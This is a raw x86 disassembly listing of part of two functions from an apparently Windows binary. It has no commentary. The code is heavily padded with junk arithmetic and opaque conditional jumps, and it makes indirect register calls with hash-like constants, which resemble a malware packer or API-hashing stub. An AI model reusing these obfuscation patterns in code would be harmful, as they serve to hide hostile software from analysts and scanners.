  406fbb:	mov    ebx,DWORD PTR [ebp-0x4c]
  406fbe:	mov    edi,DWORD PTR [ebp-0x4c]
  406fc1:	or     ecx,edx
  406fc3:	test   ebx,0x24645200
  406fc9:	je     0x40705b
  406fcf:	cmp    ebx,edx
  406fd1:	jne    0x40705b
  406fd7:	sub    eax,esi
  406fd9:	mov    esi,DWORD PTR [ebp-0x24]
  406fdc:	mov    edx,DWORD PTR [ebp-0x24]
  406fdf:	or     ebx,esi
  406fe1:	test   edi,0x12
  406fe7:	je     0x40705b
  406fe9:	mov    esi,DWORD PTR [ebp-0x54]
  406fec:	cmp    edx,0x3f
  406fef:	jne    0x40705b
  406ff1:	sub    DWORD PTR [ebp-0x24],esi
  406ff4:	add    DWORD PTR [ebp-0x54],edx
  406ff7:	test   eax,0xaf
  406ffc:	je     0x40705b
  406ffe:	mov    edx,edi
  407000:	mov    edi,DWORD PTR [ebp-0x24]
  407003:	or     ebx,eax
  407005:	cmp    ecx,DWORD PTR [ebp-0x5c]
  407008:	je     0x40705b
  40700a:	mov    esi,0x94270009
  40700f:	cmp    ebx,edi
  407011:	je     0x40705b
  407013:	mov    eax,DWORD PTR [ebp-0x54]
  407016:	add    edx,ebx
  407018:	mov    ebx,DWORD PTR ds:0x43540c
  40701e:	cmp    edi,DWORD PTR [ebp-0x20]
  407021:	jne    0x40705b
  407023:	sub    edx,ecx
  407025:	add    ebx,edx
  407027:	cmp    edi,0x1e
  40702a:	je     0x40705b
  40702c:	and    esi,ecx
  40702e:	xor    edx,edx
  407030:	mov    ecx,DWORD PTR [ebp-0x4c]
  407033:	sub    DWORD PTR [ebp-0x24],ecx
  407036:	or     DWORD PTR [ebp-0x24],esi
  407039:	sub    ebx,ecx
  40703b:	add    DWORD PTR [ebp-0x4c],eax
  40703e:	sub    DWORD PTR [ebp-0x54],edi
  407041:	cmp    ebx,0xffffff93
  407044:	je     0x40705b
  407046:	mov    esi,DWORD PTR [ebp-0x24]
  407049:	or     DWORD PTR [ebp-0x54],eax
  40704c:	mov    edi,esi
  40704e:	add    DWORD PTR [ebp-0x54],ebx
  407051:	add    edi,ebx
  407053:	sub    DWORD PTR [ebp-0x4c],edx
  407056:	and    edi,eax
  407058:	mov    DWORD PTR [ebp-0x4c],edi
  40705b:	mov    edx,DWORD PTR [ebp-0x3c]
  40705e:	test   edx,0x34
  407064:	je     0x407087
  407066:	mov    edi,0x41
  40706b:	mov    edi,0xc1
  407070:	test   edx,0x87
  407076:	jne    0x407087
  407078:	mov    ecx,DWORD PTR [ebp-0x54]
  40707b:	mov    ebx,DWORD PTR [ebp-0x54]
  40707e:	add    DWORD PTR [ebp-0x24],edi
  407081:	add    DWORD PTR [ebp-0x24],ebx
  407084:	add    DWORD PTR [ebp-0x54],ecx
  407087:	shr    edx,0x10
  40708a:	add    edi,edi
  40708c:	mov    ecx,DWORD PTR [ebp-0x24]
  40708f:	sub    edi,esi
  407091:	cmp    edx,DWORD PTR [ebp-0x2c]
  407094:	je     0x407110
  407096:	cmp    edx,ecx
  407098:	jne    0x407110
  40709a:	mov    esi,DWORD PTR [ebp-0x24]
  40709d:	xor    eax,eax
  40709f:	cmp    edi,DWORD PTR [ebp-0x24]
  4070a2:	je     0x407110
  4070a4:	add    esi,eax
  4070a6:	sub    DWORD PTR [ebp-0x54],edx
  4070a9:	test   ecx,0x8c
  4070af:	je     0x407110
  4070b1:	mov    ebx,0xb279
  4070b6:	sub    edi,ecx
  4070b8:	add    edi,esi
  4070ba:	mov    esi,DWORD PTR [ebp-0x4c]
  4070bd:	cmp    edi,0xfffffffc
  4070c0:	jne    0x407110
  4070c2:	mov    eax,0x3a49
  4070c7:	cmp    esi,0xffffff8d
  4070ca:	je     0x407110
  4070cc:	sub    DWORD PTR [ebp-0x54],esi
  4070cf:	and    ebx,edx
  4070d1:	cmp    edi,0xffffffc7
  4070d4:	je     0x407110
  4070d6:	add    DWORD PTR [ebp-0x24],edi
  4070d9:	mov    esi,0x8986
  4070de:	add    DWORD PTR [ebp-0x4c],ecx
  4070e1:	mov    edi,DWORD PTR ds:0x435414
  4070e7:	sub    eax,edx
  4070e9:	add    DWORD PTR [ebp-0x54],edi
  4070ec:	cmp    eax,DWORD PTR [ebp-0x8]
  4070ef:	jne    0x407110
  4070f1:	sub    eax,ecx
  4070f3:	xor    edi,edi
  4070f5:	mov    ecx,DWORD PTR [ebp-0x24]
  4070f8:	sub    DWORD PTR [ebp-0x54],ebx
  4070fb:	sub    DWORD PTR [ebp-0x4c],eax
  4070fe:	sub    DWORD PTR [ebp-0x24],ecx
  407101:	sub    DWORD PTR [ebp-0x24],edi
  407104:	add    DWORD PTR [ebp-0x54],ebx
  407107:	sub    esi,edx
  407109:	sub    esi,ecx
  40710b:	and    esi,ecx
  40710d:	add    DWORD PTR [ebp-0x4c],esi
  407110:	cmp    edx,0x7a04
  407116:	jne    0x407294
  40711c:	test   ebx,0xe0
  407122:	jne    0x407127
  407124:	sub    DWORD PTR [ebp-0x54],esi
  407127:	mov    ecx,0x7a44e679
  40712c:	mov    edx,DWORD PTR [ebp-0x4c]
  40712f:	add    edx,edi
  407131:	and    DWORD PTR [ebp-0x24],ecx
  407134:	cmp    edx,edi
  407136:	je     0x407143
  407138:	mov    esi,DWORD PTR [ebp-0x4c]
  40713b:	mov    eax,esi
  40713d:	or     DWORD PTR [ebp-0x54],edx
  407140:	sub    DWORD PTR [ebp-0x4c],eax
  407143:	sub    ecx,DWORD PTR [ebp-0x3c]
  407146:	mov    edx,DWORD PTR [ebp-0x54]
  407149:	cmp    edx,0xffffff8b
  40714c:	je     0x407151
  40714e:	add    DWORD PTR [ebp-0x4c],edx
  407151:	call   ecx
  407153:	add    DWORD PTR [ebp-0x54],edi
  407156:	mov    DWORD PTR [ebp-0x40],eax
  407159:	xor    DWORD PTR [ebp-0x24],eax
  40715c:	mov    edi,0x407ae1
  407161:	add    esi,eax
  407163:	sub    DWORD PTR [ebp-0x24],esi
  407166:	push   DWORD PTR [ebp-0x3c]
  407169:	push   0x7a05adfe
  40716e:	push   DWORD PTR [ebp-0x40]
  407171:	call   edi
  407173:	mov    ecx,DWORD PTR [ebp-0x4c]
  407176:	mov    eax,DWORD PTR [ebp-0x54]
  407179:	add    DWORD PTR [ebp-0x24],ecx
  40717c:	cmp    eax,0xffffffd7
  40717f:	jne    0x40718c
  407181:	mov    ecx,DWORD PTR [ebp-0x24]
  407184:	mov    esi,eax
  407186:	add    DWORD PTR [ebp-0x54],esi
  407189:	add    DWORD PTR [ebp-0x24],ecx
  40718c:	add    DWORD PTR [ebp-0x24],edi
  40718f:	add    DWORD PTR [ebp-0x40],0xd
  407196:	sub    ebx,edi
  407198:	mov    esi,DWORD PTR [ebp-0x24]
  40719b:	mov    ecx,0x5
  4071a0:	sub    esi,ecx
  4071a2:	add    esi,eax
  4071a4:	sub    esi,ecx
  4071a6:	add    DWORD PTR [ebp-0x54],ebx
  4071a9:	cmp    esi,eax
  4071ab:	jne    0x407200
  4071ad:	or     esi,ebx
  4071af:	mov    edx,DWORD PTR ds:0x435440
  4071b5:	sub    DWORD PTR [ebp-0x24],esi
  4071b8:	add    edx,edi
  4071ba:	cmp    ebx,DWORD PTR ds:0x43540c
  4071c0:	je     0x407200
  4071c2:	mov    ecx,DWORD PTR ds:0x4353fc
  4071c8:	cmp    ebx,0xffffffb6
  4071cb:	je     0x407200
  4071cd:	add    edx,edx
  4071cf:	add    DWORD PTR [ebp-0x54],edx
  4071d2:	or     ebx,edx
  4071d4:	mov    edx,0xcd
  4071d9:	mov    eax,DWORD PTR [ebp-0x4c]
  4071dc:	or     DWORD PTR [ebp-0x24],ecx
  4071df:	add    DWORD PTR [ebp-0x54],ebx
  4071e2:	sub    DWORD PTR [ebp-0x24],edx
  4071e5:	cmp    eax,edi
  4071e7:	jne    0x407200
  4071e9:	mov    esi,0x6f
  4071ee:	sub    DWORD PTR [ebp-0x4c],esi
  4071f1:	add    eax,edx
  4071f3:	mov    ecx,0xf80
  4071f8:	and    DWORD PTR [ebp-0x4c],ebx
  4071fb:	sub    eax,ecx
  4071fd:	add    DWORD PTR [ebp-0x54],eax
  407200:	mov    ecx,DWORD PTR [ebp-0x40]
  407203:	add    DWORD PTR [ebp-0x24],ecx
  407206:	call   ecx
  407208:	cmp    ebx,edi
  40720a:	je     0x407272
  40720c:	xor    edi,edi
  40720e:	sub    DWORD PTR [ebp-0x54],esi
  407211:	xor    edx,edx
  407213:	and    edx,eax
  407215:	sub    edx,ebx
  407217:	sub    edx,esi
  407219:	and    edi,edx
  40721b:	cmp    eax,0xffffffba
  40721e:	je     0x407272
  407220:	mov    esi,DWORD PTR [ebp-0x24]
  407223:	cmp    edi,0xffffffe7
  407226:	jne    0x407272
  407228:	cmp    edi,DWORD PTR [ebp-0x50]
  40722b:	je     0x407272
  40722d:	mov    ebx,0x7a
  407232:	mov    ecx,0xe713
  407237:	or     esi,edi
  407239:	cmp    esi,DWORD PTR [ebp-0x14]
  40723c:	je     0x407272
  40723e:	sub    esi,eax
  407240:	xor    DWORD PTR [ebp-0x4c],ebx
  407243:	add    esi,ebx
  407245:	xor    edx,edx
  407247:	mov    ecx,DWORD PTR [ebp-0x24]
  40724a:	add    DWORD PTR [ebp-0x24],esi
  40724d:	cmp    ecx,0xffffff85
  407250:	jne    0x407272
  407252:	mov    ebx,DWORD PTR [ebp-0x24]
  407255:	mov    esi,eax
  407257:	add    DWORD PTR [ebp-0x4c],ecx
  40725a:	sub    esi,ecx
  40725c:	sub    DWORD PTR [ebp-0x24],esi
  40725f:	cmp    ebx,0x872e
  407265:	je     0x407272
  407267:	xor    esi,esi
  407269:	or     DWORD PTR [ebp-0x24],ebx
  40726c:	or     DWORD PTR [ebp-0x4c],esi
  40726f:	add    DWORD PTR [ebp-0x54],edx
  407272:	mov    edx,0xb94b
  407277:	sub    DWORD PTR [ebp-0x4c],edx
  40727a:	mov    esi,0x2fd2
  40727f:	xor    DWORD PTR [ebp-0x54],edx
  407282:	and    esi,ecx
  407284:	sub    esi,ecx
  407286:	mov    ecx,DWORD PTR [ebp-0x4c]
  407289:	mov    DWORD PTR [ebp-0x4c],edx
  40728c:	add    ecx,edi
  40728e:	sub    DWORD PTR [ebp-0x54],ecx
  407291:	sub    DWORD PTR [ebp-0x54],esi
  407294:	xor    edx,edx
  407296:	xor    ecx,ecx
  407298:	and    ecx,esi
  40729a:	sub    ecx,esi
  40729c:	sub    DWORD PTR [ebp-0x54],ecx
  40729f:	add    edx,ebx
  4072a1:	add    DWORD PTR [ebp-0x24],edx
  4072a4:	sub    edx,eax
  4072a6:	xor    ecx,ecx
  4072a8:	cmp    edx,ecx
  4072aa:	jne    0x4072b2
  4072ac:	add    DWORD PTR [ebp-0x24],edx
  4072af:	add    DWORD PTR [ebp-0x4c],ecx
  4072b2:	add    DWORD PTR [ebp-0x24],ebx
  4072b5:	pop    edi
  4072b6:	mov    eax,DWORD PTR [ebp-0x24]
  4072b9:	add    eax,edx
  4072bb:	add    DWORD PTR [ebp-0x4c],edi
  4072be:	and    eax,edx
  4072c0:	test   eax,0x60
  4072c5:	jne    0x4072d4
  4072c7:	sub    DWORD PTR [ebp-0x4c],ebx
  4072ca:	cmp    eax,0xffffff8d
  4072cd:	je     0x4072d4
  4072cf:	and    eax,edi
  4072d1:	sub    DWORD PTR [ebp-0x24],eax
  4072d4:	pop    esi
  4072d5:	mov    ebx,DWORD PTR [ebp-0x24]
  4072d8:	mov    ecx,DWORD PTR ds:0x435404
  4072de:	and    ebx,edi
  4072e0:	add    ebx,eax
  4072e2:	cmp    esi,edx
  4072e4:	je     0x40732a
  4072e6:	add    ebx,edi
  4072e8:	mov    DWORD PTR [ebp-0x24],ecx
  4072eb:	cmp    ebx,DWORD PTR ds:0x43544c
  4072f1:	je     0x40732a
  4072f3:	mov    edx,DWORD PTR [ebp-0x24]
  4072f6:	mov    ecx,DWORD PTR [ebp-0x24]
  4072f9:	cmp    esi,DWORD PTR ds:0x435410
  4072ff:	je     0x40732a
  407301:	sub    DWORD PTR [ebp-0x4c],esi
  407304:	sub    edx,ecx
  407306:	mov    ecx,DWORD PTR [ebp-0x24]
  407309:	mov    eax,DWORD PTR [ebp-0x4c]
  40730c:	sub    DWORD PTR [ebp-0x4c],ebx
  40730f:	sub    DWORD PTR [ebp-0x4c],eax
  407312:	add    edx,edi
  407314:	sub    edx,edi
  407316:	add    DWORD PTR [ebp-0x24],edi
  407319:	sub    edx,edi
  40731b:	sub    DWORD PTR [ebp-0x4c],ecx
  40731e:	and    edx,edi
  407320:	sub    edx,esi
  407322:	sub    DWORD PTR [ebp-0x4c],esi
  407325:	add    edx,esi
  407327:	add    DWORD PTR [ebp-0x24],edx
  40732a:	pop    ebx
  40732b:	cmp    ebx,DWORD PTR ds:0x435414
  407331:	jne    0x4073af
  407333:	mov    ecx,DWORD PTR [ebp-0x24]
  407336:	mov    edx,DWORD PTR ds:0x435400
  40733c:	sub    DWORD PTR [ebp-0x54],ecx
  40733f:	cmp    ebx,DWORD PTR ds:0x435414
  407345:	je     0x4073af
  407347:	xor    edx,edx
  407349:	add    edx,esi
  40734b:	mov    ecx,DWORD PTR [ebp-0x54]
  40734e:	sub    ecx,eax
  407350:	cmp    ebx,edx
  407352:	jne    0x4073af
  407354:	mov    eax,0x9f
  407359:	xor    DWORD PTR [ebp-0x24],edx
  40735c:	mov    edx,DWORD PTR [ebp-0x4c]
  40735f:	and    DWORD PTR [ebp-0x24],edi
  407362:	cmp    ecx,DWORD PTR [ebp-0x28]
  407365:	je     0x4073af
  407367:	cmp    ecx,edx
  407369:	je     0x4073af
  40736b:	sub    DWORD PTR [ebp-0x24],edx
  40736e:	xor    edx,edx
  407370:	test   ecx,0x3e
  407376:	je     0x4073af
  407378:	or     DWORD PTR [ebp-0x54],edi
  40737b:	sub    edx,esi
  40737d:	cmp    edx,DWORD PTR ds:0x435438
  407383:	je     0x4073af
  407385:	add    DWORD PTR [ebp-0x24],ebx
  407388:	add    DWORD PTR [ebp-0x24],edx
  40738b:	mov    eax,DWORD PTR [ebp-0x4c]
  40738e:	mov    edx,DWORD PTR ds:0x435400
  407394:	cmp    eax,DWORD PTR ds:0x435404
  40739a:	je     0x4073af
  40739c:	sub    eax,ebx
  40739e:	sub    DWORD PTR [ebp-0x54],ecx
  4073a1:	add    eax,edx
  4073a3:	sub    eax,edx
  4073a5:	test   eax,0x2e
  4073aa:	je     0x4073af
  4073ac:	sub    DWORD PTR [ebp-0x4c],eax
  4073af:	leave  
  4073b0:	ret    
  4073b1:	int3   
  4073b2:	int3   
  4073b3:	int3   
  4073b4:	int3   
  4073b5:	int3   
  4073b6:	push   ebp
  4073b7:	mov    ebp,esp
  4073b9:	sub    esp,0x48
  4073bc:	xor    eax,eax
  4073be:	mov    DWORD PTR [ebp-0x4],eax
  4073c1:	push   ebx
  4073c2:	mov    eax,DWORD PTR [ebp-0x4]
  4073c5:	cmp    eax,0x4f3c
  4073ca:	je     0x4073db
  4073cc:	mov    edx,DWORD PTR [ebp-0x4]
  4073cf:	sub    eax,edx
  4073d1:	xor    ecx,ecx
  4073d3:	add    DWORD PTR [ebp-0x4],eax
  4073d6:	add    ecx,edx
  4073d8:	add    DWORD PTR [ebp-0x4],ecx
  4073db:	push   esi
  4073dc:	xor    ebx,ebx
  4073de:	sub    DWORD PTR [ebp-0x4],ebx
  4073e1:	push   edi
  4073e2:	mov    esi,0xaa
  4073e7:	mov    eax,DWORD PTR [ebp-0x4]
  4073ea:	or     DWORD PTR [ebp-0x4],esi
  4073ed:	add    DWORD PTR [ebp-0x4],eax
  4073f0:	mov    ecx,0xc
  4073f5:	add    ecx,esi
  4073f7:	or     ecx,ebx
  4073f9:	mov    DWORD PTR [ebp-0x4],ecx
  4073fc:	mov    DWORD PTR [ebp-0x48],0x21d8470c
  407403:	mov    ebx,ecx
  407405:	add    DWORD PTR [ebp-0x4],edx
  407408:	xor    eax,eax
  40740a:	sub    ebx,ecx
  40740c:	add    eax,ecx
  40740e:	sub    eax,ecx
  407410:	and    DWORD PTR [ebp-0x4],edx
  407413:	sub    DWORD PTR [ebp-0x4],ebx
  407416:	and    eax,ebx
  407418:	sub    eax,ebx
  40741a:	sub    DWORD PTR [ebp-0x4],eax
  40741d:	call   0x407985
  407422:	mov    edi,0x1a6e
  407427:	sub    DWORD PTR [ebp-0x4],edi
  40742a:	mov    DWORD PTR [ebp-0x40],eax
  40742d:	or     DWORD PTR [ebp-0x4],eax
  407430:	call   0x407985
  407435:	sub    ebx,esi
  407437:	mov    ecx,DWORD PTR [ebp-0x4]
  40743a:	sub    ebx,edi
  40743c:	sub    DWORD PTR [ebp-0x4],ebx
  40743f:	mov    esi,DWORD PTR [ebp-0x4]
  407442:	cmp    ecx,esi
  407444:	je     0x407489
  407446:	sub    esi,ebx
  407448:	add    DWORD PTR [ebp-0x4],esi
  40744b:	mov    edx,esi
  40744d:	cmp    edx,esi
  40744f:	je     0x407489
  407451:	mov    ebx,edx
  407453:	cmp    ebx,DWORD PTR ds:0x435444
  407459:	je     0x407489
  40745b:	add    ecx,ebx
  40745d:	cmp    ecx,DWORD PTR [ebp-0x4]
  407460:	je     0x407489
  407462:	mov    ebx,DWORD PTR [ebp-0x4]
  407465:	and    ecx,edx
  407467:	test   ebx,0x25
  40746d:	jne    0x407489
  40746f:	or     ecx,edx
  407471:	mov    edx,0xa3
  407476:	add    edx,edi
  407478:	mov    esi,DWORD PTR [ebp-0x4]
  40747b:	sub    edx,esi
  40747d:	sub    edx,ebx
  40747f:	add    edx,edx
  407481:	add    DWORD PTR [ebp-0x4],ecx
  407484:	and    edx,edi
  407486:	sub    DWORD PTR [ebp-0x4],edx
  407489:	mov    DWORD PTR [ebp-0x34],eax
  40748c:	mov    edx,0x22
  407491:	sub    edx,esi
  407493:	add    edx,esi
  407495:	xor    edi,edi
  407497:	add    DWORD PTR [ebp-0x4],edi
  40749a:	mov    DWORD PTR [ebp-0x4],edx
  40749d:	call   0x407985
  4074a2:	add    DWORD PTR [ebp-0x4],esi
  4074a5:	mov    DWORD PTR [ebp-0x8],eax
  4074a8:	cmp    eax,0xffffffb6
  4074ab:	je     0x4074b0
  4074ad:	sub    DWORD PTR [ebp-0x4],ebx
  4074b0:	mov    ecx,DWORD PTR [ebp-0x34]
  4074b3:	add    esi,edi
  4074b5:	mov    ebx,DWORD PTR [ebp-0x4]
  4074b8:	cmp    eax,0xdc291088
  4074bd:	jne    0x407579
  4074c3:	mov    eax,DWORD PTR [ebp-0x4]
  4074c6:	add    DWORD PTR [ebp-0x4],esi
  4074c9:	sub    DWORD PTR [ebp-0x4],ecx
  4074cc:	mov    DWORD PTR [ebp-0x4],eax
  4074cf:	mov    eax,esi
  4074d1:	cmp    ecx,DWORD PTR ds:0x435444
  4074d7:	jne    0x407579
  4074dd:	cmp    ebx,edi
  4074df:	jne    0x407579
  4074e5:	mov    edx,eax
  4074e7:	add    edx,esi
  4074e9:	mov    edi,0xbb
  4074ee:	add    edx,edx
  4074f0:	add    DWORD PTR [ebp-0x4],edi
  4074f3:	xor    DWORD PTR [ebp-0x4],edx
  4074f6:	cmp    ebx,ecx
  4074f8:	je     0x407579
  4074fa:	mov    edx,DWORD PTR [ebp-0x4]
  4074fd:	test   eax,0x0
  407502:	je     0x407579
  407504:	sub    edx,eax
  407506:	or     ebx,edx
  407508:	mov    edi,DWORD PTR [ebp-0x4]
  40750b:	cmp    edi,DWORD PTR ds:0x435444
  407511:	jne    0x407579
  407513:	mov    edx,0x58
  407518:	mov    esi,DWORD PTR [ebp-0x4]
  40751b:	add    DWORD PTR [ebp-0x4],edi
  40751e:	sub    esi,ecx
  407520:	sub    DWORD PTR [ebp-0x4],ebx
  407523:	sub    edx,edi
  407525:	sub    DWORD PTR [ebp-0x4],ebx
  407528:	cmp    edx,DWORD PTR ds:0x435444
  40752e:	jne    0x407579
  407530:	sub    esi,edi
  407532:	sub    DWORD PTR [ebp-0x4],esi
  407535:	mov    eax,DWORD PTR [ebp-0x4]
  407538:	cmp    eax,ecx
  40753a:	jne    0x407579
  40753c:	cmp    edx,0xffffff82
  40753f:	je     0x407579
  407541:	mov    DWORD PTR [ebp-0x4],ecx
  407544:	and    edx,esi
  407546:	mov    esi,0xf0
  40754b:	mov    ebx,DWORD PTR ds:0x435444
  407551:	cmp    eax,0xffffffcd
  407554:	je     0x407579
  407556:	or     DWORD PTR [ebp-0x4],edx
  407559:	add    DWORD PTR [ebp-0x4],esi
  40755c:	add    DWORD PTR [ebp-0x4],eax
  40755f:	xor    edx,edx
  407561:	mov    esi,0xcc
  407566:	add    esi,ecx
  407568:	sub    esi,ebx
  40756a:	sub    esi,ecx
  40756c:	add    edx,ebx
  40756e:	add    edx,edi
  407570:	sub    DWORD PTR [ebp-0x4],eax
  407573:	add    DWORD PTR [ebp-0x4],esi
  407576:	add    DWORD PTR [ebp-0x4],edx
  407579:	sub    ecx,DWORD PTR [ebp-0x40]
  40757c:	mov    eax,0x37
  407581:	cmp    ecx,esi
  407583:	je     0x4075b4
  407585:	mov    ebx,0x29
  40758a:	sub    DWORD PTR [ebp-0x4],eax
  40758d:	cmp    edi,DWORD PTR [ebp-0x3c]
  407590:	jne    0x4075b4
  407592:	xor    eax,eax
  407594:	mov    edx,DWORD PTR ds:0x435444
  40759a:	sub    ebx,edx
  40759c:	and    eax,ebx
  40759e:	and    DWORD PTR [ebp-0x4],ecx
  4075a1:	add    esi,edi
  4075a3:	xor    DWORD PTR [ebp-0x4],eax
  4075a6:	sub    DWORD PTR [ebp-0x4],eax
  4075a9:	test   esi,0xbf
  4075af:	jne    0x4075b4
  4075b1:	or     DWORD PTR [ebp-0x4],esi
  4075b4:	xor    ecx,0xa184026d
  4075ba:	mov    edi,DWORD PTR [ebp-0x4]
  4075bd:	sub    edi,esi
  4075bf:	cmp    edi,0x6c
  4075c2:	jne    0x407609
  4075c4:	mov    ebx,0xd3
  4075c9:	add    ebx,edi
  4075cb:	mov    edx,DWORD PTR [ebp-0x4]
  4075ce:	sub    ebx,ecx
  4075d0:	test   ebx,0x1f
  4075d6:	jne    0x407609
  4075d8:	mov    eax,DWORD PTR [ebp-0x4]
  4075db:	mov    esi,edx
  4075dd:	cmp    ebx,0xffffffaa
  4075e0:	jne    0x407609
  4075e2:	add    esi,eax
  4075e4:	xor    DWORD PTR [ebp-0x4],ebx
  4075e7:	mov    eax,DWORD PTR ds:0x43543c
  4075ed:	sub    DWORD PTR [ebp-0x4],ecx
  4075f0:	sub    DWORD PTR [ebp-0x4],eax
  4075f3:	add    DWORD PTR [ebp-0x4],ebx
  4075f6:	cmp    esi,0x5d
  4075f9:	je     0x407609
  4075fb:	add    esi,eax
  4075fd:	mov    edi,DWORD PTR [ebp-0x4]
  407600:	mov    DWORD PTR [ebp-0x4],edi
  407603:	sub    DWORD PTR [ebp-0x4],edi
  407606:	add    DWORD PTR [ebp-0x4],esi
  407609:	mov    ebx,DWORD PTR [ebp-0x8]
  40760c:	cmp    ebx,0x192a
  407612:	je     0x407741
  407618:	cmp    ebx,0xffffffa6
  40761b:	je     0x407741
  407621:	add    esi,eax
  407623:	add    esi,esi
  407625:	test   ebx,0x35
  40762b:	jne    0x407741
  407631:	mov    eax,0x6557
  407636:	mov    edx,DWORD PTR [ebp-0x4]
  407639:	cmp    edx,ecx
  40763b:	jne    0x407741
  407641:	mov    eax,DWORD PTR ds:0x43543c
  407647:	test   edx,0x71f7
  40764d:	jne    0x407741
  407653:	mov    edi,DWORD PTR [ebp-0x4]
  407656:	cmp    edi,ecx
  407658:	jne    0x407741
  40765e:	cmp    ecx,0xffffff90
  407661:	jne    0x407741
  407667:	mov    DWORD PTR [ebp-0x4],edi
  40766a:	mov    edi,DWORD PTR [ebp-0x4]
  40766d:	test   edi,0xc6
  407673:	je     0x407741
  407679:	add    edx,esi
  40767b:	mov    esi,0xec
  407680:	mov    eax,esi
  407682:	sub    eax,ecx
  407684:	cmp    eax,DWORD PTR ds:0x43543c
  40768a:	jne    0x407741
  407690:	sub    edx,esi
  407692:	add    DWORD PTR [ebp-0x4],edx
  407695:	cmp    eax,DWORD PTR ds:0x43543c
  40769b:	jne    0x407741
  4076a1:	xor    esi,esi
  4076a3:	cmp    edi,0xffffff96
  4076a6:	jne    0x407741
  4076ac:	sub    esi,ebx
  4076ae:	mov    edx,DWORD PTR [ebp-0x4]
  4076b1:	and    DWORD PTR [ebp-0x4],eax
  4076b4:	mov    eax,DWORD PTR ds:0x435454
  4076ba:	mov    DWORD PTR [ebp-0x4],eax
  4076bd:	cmp    esi,0x25
  4076c0:	je     0x407741
  4076c2:	cmp    esi,ecx
  4076c4:	je     0x407741
  4076c6:	test   edi,0xa9e1
  4076cc:	je     0x407741
  4076ce:	and    esi,edx
  4076d0:	cmp    edi,0x25
  4076d3:	jne    0x407741
  4076d5:	mov    edx,0xa7
  4076da:	add    DWORD PTR [ebp-0x4],ebx
  4076dd:	or     esi,ebx
  4076df:	cmp    edi,0xfffffff1
  4076e2:	jne    0x407741
  4076e4:	add    edx,ecx
  4076e6:	mov    eax,DWORD PTR [ebp-0x4]
  4076e9:	and    edx,eax
  4076eb:	add    DWORD PTR [ebp-0x4],edi
  4076ee:	sub    esi,ecx
  4076f0:	add    esi,ecx
  4076f2:	cmp    esi,edx
  4076f4:	jne    0x407741
  4076f6:	mov    edi,0xc8
  4076fb:	add    DWORD PTR [ebp-0x4],edi
  4076fe:	cmp    edx,ebx
  407700:	je     0x407741
  407702:	mov    eax,esi
  407704:	mov    esi,DWORD PTR [ebp-0x4]
  407707:	add    esi,edx
  407709:	cmp    esi,DWORD PTR ds:0x435444
  40770f:	je     0x407741
  407711:	sub    esi,edx
  407713:	sub    DWORD PTR [ebp-0x4],esi
  407716:	mov    edx,DWORD PTR [ebp-0x4]
  407719:	sub    DWORD PTR [ebp-0x4],eax
  40771c:	add    edx,eax
  40771e:	or     edx,ecx
  407720:	cmp    edx,0x86d19404
  407726:	jne    0x407741
  407728:	mov    eax,DWORD PTR ds:0x435444
  40772e:	mov    esi,DWORD PTR ds:0x435428
  407734:	and    edx,ebx
  407736:	or     DWORD PTR [ebp-0x4],edx
  407739:	add    DWORD PTR [ebp-0x4],edx
  40773c:	add    eax,esi
  40773e:	sub    DWORD PTR [ebp-0x4],eax
  407741:	sub    ebx,DWORD PTR [ebp-0x34]
  407744:	sub    edi,ecx
  407746:	mov    edx,DWORD PTR [ebp-0x4]
  407749:	and    DWORD PTR [ebp-0x4],esi
  40774c:	mov    esi,ecx
  40774e:	cmp    ecx,0xffffff83
  407751:	je     0x40775b
  407753:	add    esi,edi
  407755:	mov    DWORD PTR [ebp-0x4],esi
  407758:	sub    DWORD PTR [ebp-0x4],edx
  40775b:	xor    ebx,0xa1840268
  407761:	xor    DWORD PTR [ebp-0x4],ebx
  407764:	cmp    ecx,ebx
  407766:	je     0x407891
  40776c:	add    DWORD PTR [ebp-0x4],edx
  40776f:	push   0x435444
  407774:	call   DWORD PTR ds:0x43528c
  40777a:	mov    ecx,0xe1
  40777f:	mov    esi,0xbf
  407784:	or     DWORD PTR [ebp-0x4],esi
  407787:	sub    DWORD PTR [ebp-0x4],eax
  40778a:	xor    DWORD PTR [ebp-0x4],edi
  40778d:	sub    ecx,edi
  40778f:	test   ebx,0x3d
  407795:	je     0x40779c
  407797:	and    ecx,eax
  407799:	add    DWORD PTR [ebp-0x4],ecx
  40779c:	or     eax,eax
  40779e:	je     0x407891
  4077a4:	sub    ebx,edi
  4077a6:	add    DWORD PTR [ebp-0x4],ebx
  4077a9:	add    DWORD PTR [ebp-0x48],0x7d2c428c
  4077b0:	xor    esi,esi
  4077b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4077b5:	or     DWORD PTR [ebp-0x4],esi
  4077b8:	cmp    ecx,0xfffffff7
  4077bb:	je     0x407811
  4077bd:	sub    DWORD PTR [ebp-0x4],ebx
  4077c0:	sub    ecx,esi
  4077c2:	and    ecx,edi
  4077c4:	mov    edx,DWORD PTR [ebp-0x4]
  4077c7:	mov    esi,DWORD PTR [ebp-0x4]
  4077ca:	cmp    esi,DWORD PTR ds:0x435428
  4077d0:	jne    0x407811
  4077d2:	cmp    ecx,0xffffffd8
  4077d5:	je     0x407811
  4077d7:	mov    ebx,DWORD PTR [ebp-0x4]
  4077da:	mov    edi,ebx
  4077dc:	test   edi,0x38
  4077e2:	je     0x407811
  4077e4:	cmp    edx,0xfe9
  4077ea:	jne    0x407811
  4077ec:	xor    DWORD PTR [ebp-0x4],esi
  4077ef:	sub    edi,esi
  4077f1:	add    ecx,edi
  4077f3:	mov    edi,DWORD PTR [ebp-0x4]
  4077f6:	test   edx,0x191
  4077fc:	je     0x407811
  4077fe:	mov    ebx,DWORD PTR [ebp-0x4]
  407801:	mov    esi,DWORD PTR [ebp-0x4]
  407804:	add    DWORD PTR [ebp-0x4],edx
  407807:	or     ebx,edi
  407809:	add    ecx,ebx
  40780b:	mov    DWORD PTR [ebp-0x4],esi
  40780e:	add    DWORD PTR [ebp-0x4],ecx
  407811:	lea    edx,[eax+0xc85]
  407817:	mov    DWORD PTR [ebp-0x4],edx
  40781a:	inc    edx
  40781b:	cmp    edx,0x46b1
  407821:	jne    0x40783a
  407823:	mov    ecx,DWORD PTR [ebp-0x4]
  407826:	mov    ebx,eax
  407828:	sub    ecx,edx
  40782a:	or     DWORD PTR [ebp-0x4],ecx
  40782d:	sub    ebx,edi
  40782f:	sub    DWORD PTR [ebp-0x4],edx
  407832:	cmp    ebx,0x64
  407835:	je     0x40783a
  407837:	add    DWORD PTR [ebp-0x4],ebx
  40783a:	mov    ecx,DWORD PTR [edx]
  40783c:	sub    DWORD PTR [ebp-0x4],ecx
